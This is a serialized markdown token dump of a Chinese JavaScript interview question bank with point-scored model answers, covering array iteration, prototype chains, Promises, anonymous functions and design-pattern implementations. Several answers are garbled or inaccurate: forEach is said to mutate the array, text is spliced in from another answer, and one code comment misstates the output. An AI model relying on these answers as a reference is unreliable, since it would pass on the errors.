只返回数组的下标对应的属性值；","tokens":[{"type":"text","raw":"对于数组的遍历，for…in 会返回数组中所有可枚举的属性(包括原型链上可枚举的属性)，for…of 只返回数组的下标对应的属性值；","text":"对于数组的遍历，for…in 会返回数组中所有可枚举的属性(包括原型链上可枚举的属性)，for…of 只返回数组的下标对应的属性值；","tokens":[{"type":"text","raw":"对于数组的遍历，for…in 会返回数组中所有可枚举的属性(包括原型链上可枚举的属性)，for…of 只返回数组的下标对应的属性值；","text":"对于数组的遍历，for…in 会返回数组中所有可枚举的属性(包括原型链上可枚举的属性)，for…of 只返回数组的下标对应的属性值；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 28. forEach和map的区别？\\n\\n","depth":2,"text":"28. forEach和map的区别？","tokens":[{"type":"text","raw":"28. forEach和map的区别？","text":"28. forEach和map的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 这方法都是用来遍历数组的，两者区别如下：\\n\\n- for…of 遍历获取的是对象的键值，for…in 获取的是对象的键名forEach()方法会针对每一个元素执行提供的函数，对数据的操作会改变原数组，该方法没有返回值；\\n\\n- map()方法不会改变原数组的值，返回一个新数组，新数组中的值为原数组调用函数处理之后的值；","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 这方法都是用来遍历数组的，两者区别如下：\\n\\n","task":false,"loose":true,"text":"这方法都是用来遍历数组的，两者区别如下：\\n","tokens":[{"type":"text","raw":"这方法都是用来遍历数组的，两者区别如下：\\n","text":"这方法都是用来遍历数组的，两者区别如下：","tokens":[{"type":"text","raw":"这方法都是用来遍历数组的，两者区别如下：","text":"这方法都是用来遍历数组的，两者区别如下：","escaped":false}]}]},{"type":"list_item","raw":"- for…of 遍历获取的是对象的键值，for…in 获取的是对象的键名forEach()方法会针对每一个元素执行提供的函数，对数据的操作会改变原数组，该方法没有返回值；\\n\\n","task":false,"loose":true,"text":"for…of 遍历获取的是对象的键值，for…in 获取的是对象的键名forEach()方法会针对每一个元素执行提供的函数，对数据的操作会改变原数组，该方法没有返回值；\\n","tokens":[{"type":"text","raw":"for…of 遍历获取的是对象的键值，for…in 获取的是对象的键名forEach()方法会针对每一个元素执行提供的函数，对数据的操作会改变原数组，该方法没有返回值；\\n","text":"for…of 遍历获取的是对象的键值，for…in 获取的是对象的键名forEach()方法会针对每一个元素执行提供的函数，对数据的操作会改变原数组，该方法没有返回值；","tokens":[{"type":"text","raw":"for…of 遍历获取的是对象的键值，for…in 获取的是对象的键名forEach()方法会针对每一个元素执行提供的函数，对数据的操作会改变原数组，该方法没有返回值；","text":"for…of 遍历获取的是对象的键值，for…in 获取的是对象的键名forEach()方法会针对每一个元素执行提供的函数，对数据的操作会改变原数组，该方法没有返回值；","escaped":false}]}]},{"type":"list_item","raw":"- map()方法不会改变原数组的值，返回一个新数组，新数组中的值为原数组调用函数处理之后的值；","task":false,"loose":true,"text":"map()方法不会改变原数组的值，返回一个新数组，新数组中的值为原数组调用函数处理之后的值；","tokens":[{"type":"text","raw":"map()方法不会改变原数组的值，返回一个新数组，新数组中的值为原数组调用函数处理之后的值；","text":"map()方法不会改变原数组的值，返回一个新数组，新数组中的值为原数组调用函数处理之后的值；","tokens":[{"type":"text","raw":"map()方法不会改变原数组的值，返回一个新数组，新数组中的值为原数组调用函数处理之后的值；","text":"map()方法不会改变原数组的值，返回一个新数组，新数组中的值为原数组调用函数处理之后的值；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 29. 原型链的终点是什么？如何打印出原型链的终点？\\n\\n","depth":2,"text":"29. 原型链的终点是什么？如何打印出原型链的终点？","tokens":[{"type":"text","raw":"29. 原型链的终点是什么？如何打印出原型链的终点？","text":"29. 原型链的终点是什么？如何打印出原型链的终点？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"code","raw":"``` detail\\n\\n由于Object是构造函数，原型链终点是Object.prototype.__proto__，而Object.prototype.__proto__=== null // true，所以，原型链的终点是null。原型链上的所有原型都是对象，所有的对象最终都是由Object构造的，而Object.prototype的下一级是Object.prototype.__proto__。\\n\\n```","lang":"detail","text":"\\n由于Object是构造函数，原型链终点是Object.prototype.__proto__，而Object.prototype.__proto__=== null // true，所以，原型链的终点是null。原型链上的所有原型都是对象，所有的对象最终都是由Object构造的，而Object.prototype的下一级是Object.prototype.__proto__。\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 29. 如何获得对象非原型链上的属性？\\n\\n","depth":2,"text":"29. 如何获得对象非原型链上的属性？","tokens":[{"type":"text","raw":"29. 如何获得对象非原型链上的属性？","text":"29. 如何获得对象非原型链上的属性？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 使用后hasOwnProperty()方法来判断属性是否属于原型链的属性：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 使用后hasOwnProperty()方法来判断属性是否属于原型链的属性：","task":false,"loose":false,"text":"使用后hasOwnProperty()方法来判断属性是否属于原型链的属性：","tokens":[{"type":"text","raw":"使用后hasOwnProperty()方法来判断属性是否属于原型链的属性：","text":"使用后hasOwnProperty()方法来判断属性是否属于原型链的属性：","tokens":[{"type":"text","raw":"使用后hasOwnProperty()方法来判断属性是否属于原型链的属性：","text":"使用后hasOwnProperty()方法来判断属性是否属于原型链的属性：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nfunction iterate(obj){\\n   var res=[];\\n   for(var key in obj){\\n        if(obj.hasOwnProperty(key))\\n           res.push(key+\': \'+obj[key]);\\n   }\\n   return res;\\n} \\n\\n```","lang":"js","text":"\\nfunction iterate(obj){\\n   var res=[];\\n   for(var key in obj){\\n        if(obj.hasOwnProperty(key))\\n           res.push(key+\': \'+obj[key]);\\n   }\\n   return res;\\n} \\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 30. Promise.all和Promise.race的区别的使用场景？\\n\\n","depth":2,"text":"30. Promise.all和Promise.race的区别的使用场景？","tokens":[{"type":"text","raw":"30. Promise.all和Promise.race的区别的使用场景？","text":"30. Promise.all和Promise.race的区别的使用场景？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- Promise.all Promise.all可以将多个Promise实例包装成一个新的Promise实例。同时，成功和失败的返回值是不同的，成功的时候返回的是一个结果数组，而失败的时候则返回最先被reject失败状态的值。\\n\\n- Promise.all中传入的是数组，返回的也是是数组，并且会将进行映射，传入的promise对象返回的值是按照顺序在数组中排列的，但是注意的是他们执行的顺序并不是按照顺序的，除非可迭代对象为空。\\n\\n- 需要注意，Promise.all获得的成功结果的数组里面的数据顺序和Promise.all接收到的数组顺序是一致的，这样当遇到发送多个请求并根据请求顺序获取和使用数据的场景，就可以使用Promise.all来解决。\\n\\n- Promise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态。当要做一件事，超过多长时间就不做了，可以用这个方法来解决：","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Promise.all Promise.all可以将多个Promise实例包装成一个新的Promise实例。同时，成功和失败的返回值是不同的，成功的时候返回的是一个结果数组，而失败的时候则返回最先被reject失败状态的值。\\n\\n","task":false,"loose":true,"text":"Promise.all Promise.all可以将多个Promise实例包装成一个新的Promise实例。同时，成功和失败的返回值是不同的，成功的时候返回的是一个结果数组，而失败的时候则返回最先被reject失败状态的值。\\n","tokens":[{"type":"text","raw":"Promise.all Promise.all可以将多个Promise实例包装成一个新的Promise实例。同时，成功和失败的返回值是不同的，成功的时候返回的是一个结果数组，而失败的时候则返回最先被reject失败状态的值。\\n","text":"Promise.all Promise.all可以将多个Promise实例包装成一个新的Promise实例。同时，成功和失败的返回值是不同的，成功的时候返回的是一个结果数组，而失败的时候则返回最先被reject失败状态的值。","tokens":[{"type":"text","raw":"Promise.all Promise.all可以将多个Promise实例包装成一个新的Promise实例。同时，成功和失败的返回值是不同的，成功的时候返回的是一个结果数组，而失败的时候则返回最先被reject失败状态的值。","text":"Promise.all Promise.all可以将多个Promise实例包装成一个新的Promise实例。同时，成功和失败的返回值是不同的，成功的时候返回的是一个结果数组，而失败的时候则返回最先被reject失败状态的值。","escaped":false}]}]},{"type":"list_item","raw":"- Promise.all中传入的是数组，返回的也是是数组，并且会将进行映射，传入的promise对象返回的值是按照顺序在数组中排列的，但是注意的是他们执行的顺序并不是按照顺序的，除非可迭代对象为空。\\n\\n","task":false,"loose":true,"text":"Promise.all中传入的是数组，返回的也是是数组，并且会将进行映射，传入的promise对象返回的值是按照顺序在数组中排列的，但是注意的是他们执行的顺序并不是按照顺序的，除非可迭代对象为空。\\n","tokens":[{"type":"text","raw":"Promise.all中传入的是数组，返回的也是是数组，并且会将进行映射，传入的promise对象返回的值是按照顺序在数组中排列的，但是注意的是他们执行的顺序并不是按照顺序的，除非可迭代对象为空。\\n","text":"Promise.all中传入的是数组，返回的也是是数组，并且会将进行映射，传入的promise对象返回的值是按照顺序在数组中排列的，但是注意的是他们执行的顺序并不是按照顺序的，除非可迭代对象为空。","tokens":[{"type":"text","raw":"Promise.all中传入的是数组，返回的也是是数组，并且会将进行映射，传入的promise对象返回的值是按照顺序在数组中排列的，但是注意的是他们执行的顺序并不是按照顺序的，除非可迭代对象为空。","text":"Promise.all中传入的是数组，返回的也是是数组，并且会将进行映射，传入的promise对象返回的值是按照顺序在数组中排列的，但是注意的是他们执行的顺序并不是按照顺序的，除非可迭代对象为空。","escaped":false}]}]},{"type":"list_item","raw":"- 需要注意，Promise.all获得的成功结果的数组里面的数据顺序和Promise.all接收到的数组顺序是一致的，这样当遇到发送多个请求并根据请求顺序获取和使用数据的场景，就可以使用Promise.all来解决。\\n\\n","task":false,"loose":true,"text":"需要注意，Promise.all获得的成功结果的数组里面的数据顺序和Promise.all接收到的数组顺序是一致的，这样当遇到发送多个请求并根据请求顺序获取和使用数据的场景，就可以使用Promise.all来解决。\\n","tokens":[{"type":"text","raw":"需要注意，Promise.all获得的成功结果的数组里面的数据顺序和Promise.all接收到的数组顺序是一致的，这样当遇到发送多个请求并根据请求顺序获取和使用数据的场景，就可以使用Promise.all来解决。\\n","text":"需要注意，Promise.all获得的成功结果的数组里面的数据顺序和Promise.all接收到的数组顺序是一致的，这样当遇到发送多个请求并根据请求顺序获取和使用数据的场景，就可以使用Promise.all来解决。","tokens":[{"type":"text","raw":"需要注意，Promise.all获得的成功结果的数组里面的数据顺序和Promise.all接收到的数组顺序是一致的，这样当遇到发送多个请求并根据请求顺序获取和使用数据的场景，就可以使用Promise.all来解决。","text":"需要注意，Promise.all获得的成功结果的数组里面的数据顺序和Promise.all接收到的数组顺序是一致的，这样当遇到发送多个请求并根据请求顺序获取和使用数据的场景，就可以使用Promise.all来解决。","escaped":false}]}]},{"type":"list_item","raw":"- Promise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态。当要做一件事，超过多长时间就不做了，可以用这个方法来解决：","task":false,"loose":true,"text":"Promise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态。当要做一件事，超过多长时间就不做了，可以用这个方法来解决：","tokens":[{"type":"text","raw":"Promise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态。当要做一件事，超过多长时间就不做了，可以用这个方法来解决：","text":"Promise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态。当要做一件事，超过多长时间就不做了，可以用这个方法来解决：","tokens":[{"type":"text","raw":"Promise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态。当要做一件事，超过多长时间就不做了，可以用这个方法来解决：","text":"Promise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态。当要做一件事，超过多长时间就不做了，可以用这个方法来解决：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 31. 匿名函数的典型应用场景是什么？\\n\\n","depth":2,"text":"31. 匿名函数的典型应用场景是什么？","tokens":[{"type":"text","raw":"31. 匿名函数的典型应用场景是什么？","text":"31. 匿名函数的典型应用场景是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 匿名函数可以在 IIFE 中使用，来封装局部作用域内的代码，以便其声明的变量不会暴露到全局作用域。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 匿名函数可以在 IIFE 中使用，来封装局部作用域内的代码，以便其声明的变量不会暴露到全局作用域。","task":false,"loose":false,"text":"匿名函数可以在 IIFE 中使用，来封装局部作用域内的代码，以便其声明的变量不会暴露到全局作用域。","tokens":[{"type":"text","raw":"匿名函数可以在 IIFE 中使用，来封装局部作用域内的代码，以便其声明的变量不会暴露到全局作用域。","text":"匿名函数可以在 IIFE 中使用，来封装局部作用域内的代码，以便其声明的变量不会暴露到全局作用域。","tokens":[{"type":"text","raw":"匿名函数可以在 IIFE 中使用，来封装局部作用域内的代码，以便其声明的变量不会暴露到全局作用域。","text":"匿名函数可以在 IIFE 中使用，来封装局部作用域内的代码，以便其声明的变量不会暴露到全局作用域。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n(function () {\\n  // 一些代码。\\n})();\\n```","lang":"js","text":"(function () {\\n  // 一些代码。\\n})();"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 匿名函数可以作为只用一次，不需要在其他地方使用的回调函数。当处理函数在调用它们的程序内部被定义时，代码具有更好地自闭性和可读性，可以省去寻找该处理函数的函数体位置的麻烦。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 匿名函数可以作为只用一次，不需要在其他地方使用的回调函数。当处理函数在调用它们的程序内部被定义时，代码具有更好地自闭性和可读性，可以省去寻找该处理函数的函数体位置的麻烦。","task":false,"loose":false,"text":"匿名函数可以作为只用一次，不需要在其他地方使用的回调函数。当处理函数在调用它们的程序内部被定义时，代码具有更好地自闭性和可读性，可以省去寻找该处理函数的函数体位置的麻烦。","tokens":[{"type":"text","raw":"匿名函数可以作为只用一次，不需要在其他地方使用的回调函数。当处理函数在调用它们的程序内部被定义时，代码具有更好地自闭性和可读性，可以省去寻找该处理函数的函数体位置的麻烦。","text":"匿名函数可以作为只用一次，不需要在其他地方使用的回调函数。当处理函数在调用它们的程序内部被定义时，代码具有更好地自闭性和可读性，可以省去寻找该处理函数的函数体位置的麻烦。","tokens":[{"type":"text","raw":"匿名函数可以作为只用一次，不需要在其他地方使用的回调函数。当处理函数在调用它们的程序内部被定义时，代码具有更好地自闭性和可读性，可以省去寻找该处理函数的函数体位置的麻烦。","text":"匿名函数可以作为只用一次，不需要在其他地方使用的回调函数。当处理函数在调用它们的程序内部被定义时，代码具有更好地自闭性和可读性，可以省去寻找该处理函数的函数体位置的麻烦。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nsetTimeout(function () {\\n  console.log(\'Hello world!\');\\n}, 1000);\\n\\n```","lang":"js","text":"\\nsetTimeout(function () {\\n  console.log(\'Hello world!\');\\n}, 1000);\\n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 匿名函数可以用于函数式编程或 Lodash（类似于回调函数）。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 匿名函数可以用于函数式编程或 Lodash（类似于回调函数）。","task":false,"loose":false,"text":"匿名函数可以用于函数式编程或 Lodash（类似于回调函数）。","tokens":[{"type":"text","raw":"匿名函数可以用于函数式编程或 Lodash（类似于回调函数）。","text":"匿名函数可以用于函数式编程或 Lodash（类似于回调函数）。","tokens":[{"type":"text","raw":"匿名函数可以用于函数式编程或 Lodash（类似于回调函数）。","text":"匿名函数可以用于函数式编程或 Lodash（类似于回调函数）。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst arr = [1, 2, 3];\\nconst double = arr.map(function (el) {\\n  return el * 2;\\n});\\nconsole.log(double); // [2, 4, 6]\\n\\n```","lang":"js","text":"const arr = [1, 2, 3];\\nconst double = arr.map(function (el) {\\n  return el * 2;\\n});\\nconsole.log(double); // [2, 4, 6]\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 32. 手写单例模式（创建模式）\\n\\n","depth":2,"text":"32. 手写单例模式（创建模式）","tokens":[{"type":"text","raw":"32. 手写单例模式（创建模式）","text":"32. 手写单例模式（创建模式）","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"code","raw":"```js\\n    let CreateSingleton = (function(){\\n       let instance;\\n       return function(name) {\\n           if (instance) {\\n               return instance;\\n           }\\n           this.name = name;\\n           return instance = this;\\n       }\\n    })();\\n    CreateSingleton.prototype.getName = function() {\\n       console.log(this.name);\\n    }\\n\\nlet Winner = new CreateSingleton(\'Winner\');\\nlet Looser = new CreateSingleton(\'Looser\');\\n​\\nconsole.log(Winner === Looser); // true\\nconsole.log(Winner.getName());  // \'Winner\'\\nconsole.log(Looser.getName());  // \'Winner\'\\n\\n```","lang":"js","text":"    let CreateSingleton = (function(){\\n       let instance;\\n       return function(name) {\\n           if (instance) {\\n               return instance;\\n           }\\n           this.name = name;\\n           return instance = this;\\n       }\\n    })();\\n    CreateSingleton.prototype.getName = function() {\\n       console.log(this.name);\\n    }\\n\\nlet Winner = new CreateSingleton(\'Winner\');\\nlet Looser = new CreateSingleton(\'Looser\');\\n​\\nconsole.log(Winner === Looser); // true\\nconsole.log(Winner.getName());  // \'Winner\'\\nconsole.log(Looser.getName());  // \'Winner\'\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 33. 手写观察者模式（行为模式）\\n\\n","depth":2,"text":"33. 手写观察者模式（行为模式）","tokens":[{"type":"text","raw":"33. 手写观察者模式（行为模式）","text":"33. 手写观察者模式（行为模式）","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"code","raw":"```js\\nconst queuedObservers = new Set();\\nconst observe = fn => queuedObservers.add(fn);\\n​\\n​\\nconst observable = obj => new Proxy(obj, {\\n  set(target, key, value, receiver) {\\n    const result = Reflect.set(target, key, value, receiver);\\n    // notify\\n    queuedObservers.forEach(observer => observer());\\n    return result;\\n  }\\n});\\n\\nobj = observable({\\n  name:\'789\'\\n})\\n​\\nobserve(function test(){\\n  console.log(\'触发了\')\\n})\\n​\\nobj.name =\\"前端柒八九\\"\\n\\n```","lang":"js","text":"const queuedObservers = new Set();\\nconst observe = fn => queuedObservers.add(fn);\\n​\\n​\\nconst observable = obj => new Proxy(obj, {\\n  set(target, key, value, receiver) {\\n    const result = Reflect.set(target, key, value, receiver);\\n    // notify\\n    queuedObservers.forEach(observer => observer());\\n    return result;\\n  }\\n});\\n\\nobj = observable({\\n  name:\'789\'\\n})\\n​\\nobserve(function test(){\\n  console.log(\'触发了\')\\n})\\n​\\nobj.name =\\"前端柒八九\\"\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 34. 手写发布订阅 （行为模式）\\n\\n","depth":2,"text":"34. 手写发布订阅 （行为模式）","tokens":[{"type":"text","raw":"34. 手写发布订阅 （行为模式）","text":"34. 手写发布订阅 （行为模式）","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"code","raw":"```js\\nclass Observer {\\n  caches = {}; // 事件中心\\n  \\n  // eventName事件名-独一无二, fn订阅后执行的自定义行为\\n  on (eventName, fn){ \\n    this.caches[eventName] = this.caches[eventName] || [];\\n    this.caches[eventName].push(fn);\\n  }\\n  \\n  // 发布 => 将订阅的事件进行统一执行\\n  emit (eventName, data) { \\n    if (this.caches[eventName]) {\\n      this.caches[eventName]\\n      .forEach(fn => fn(data));\\n    }\\n  }\\n  // 取消订阅 => 若fn不传, 直接取消该事件所有订阅信息\\n  off (eventName, fn) { \\n    if (this.caches[eventName]) {\\n      const newCaches = fn \\n        ? this.caches[eventName].filter(e => e !== fn) \\n        : [];\\n      this.caches[eventName] = newCaches;\\n    }\\n  }\\n​\\n}\\n\\n    ob = new Observer();\\n    ​\\n    l1 = (data) => console.log(`l1_${data}`)\\n    l2 = (data) => console.log(`l2_${data}`)\\n    ​\\n    ob.on(\'event1\',l1)\\n    ob.on(\'event1\',l2)\\n    ​\\n    //发布订阅\\n    ob.emit(\'event1\',789) \\n    // l1_789\\n    // l2_789\\n    ​\\n    // 取消，订阅l1\\n    ob.off(\'event1\',l1)\\n    ​\\n    ob.emit(\'event1\',567)\\n\\n```","lang":"js","text":"class Observer 